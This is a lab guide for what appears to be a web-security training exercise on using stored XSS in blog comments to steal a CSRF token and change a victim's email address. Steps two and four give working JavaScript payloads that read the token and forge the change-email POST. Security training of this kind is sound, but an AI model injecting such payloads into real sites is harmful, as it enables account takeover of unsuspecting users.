# 🛡️ Lab Guide: Exploiting XSS to Bypass CSRF Defenses

This guide demonstrates how to exploit a **Cross-Site Scripting (XSS)** vulnerability to bypass CSRF protections and change a victim’s email address using **Burp Suite**. You’ll craft a payload to extract a CSRF token and perform an unauthorized action. Let’s get started! 🚀

---

## 📋 Objective
Exploit an XSS vulnerability in a blog comment system to extract a CSRF token and issue a POST request to change the victim’s email address, bypassing CSRF protections.

---

## 🛠️ Tools Needed
- **Burp Suite** (with Burp’s browser)
- Basic understanding of XSS, CSRF, and HTTP requests

---

## 📝 Step-by-Step Instructions

### 1️⃣ Analyze the Email Update Functionality
- Log in to your account using the provided credentials in **Burp’s browser**.
- Navigate to the account page (e.g., `https://YOUR-LAB-ID.web-security-academy.net/my-account`).
- View the page source and note:
  - The email update requires a POST request to `/my-account/change-email` with parameters `email` and `csrf`.
  - The CSRF token is in a hidden input field named `csrf`.

### 2️⃣ Craft the XSS Payload
- Navigate to a blog post (e.g., `https://YOUR-LAB-ID.web-security-academy.net/post?postId=1`) and access the comment submission form.
- Submit the following XSS payload in the comment field:
  ```html
  <script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get','/my-account',true);
  req.send();
  function handleResponse() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
      var changeReq = new XMLHttpRequest();
      changeReq.open('post', '/my-account/change-email', true);
      changeReq.send('csrf='+token+'&email=test@test.com');
  };
  </script>
  ```
- **Note**: This script fetches the `/my-account` page, extracts the CSRF token, and sends a POST request to change the victim’s email to `test@test.com`.

### 3️⃣ Verify the Exploit
- When a victim (e.g., the admin) views the comment, the script executes in their browser, changing their email address.
- Log in as the victim (if credentials are provided) or check the lab interface to confirm the email change.

### 4️⃣ Alternative Approach (For Reference)
- You could use a simpler payload to perform the same action directly:
  ```javascript
  window.addEventListener('DOMContentLoaded', function(){
      var token = document.getElementsByName('csrf')[0].value;
      this.fetch('/my-account/change-email', {
          method: 'POST',
          mode: 'no-cors',
          body: 'email=IyYV7@example.com&csrf='+token
      });
  });
  ```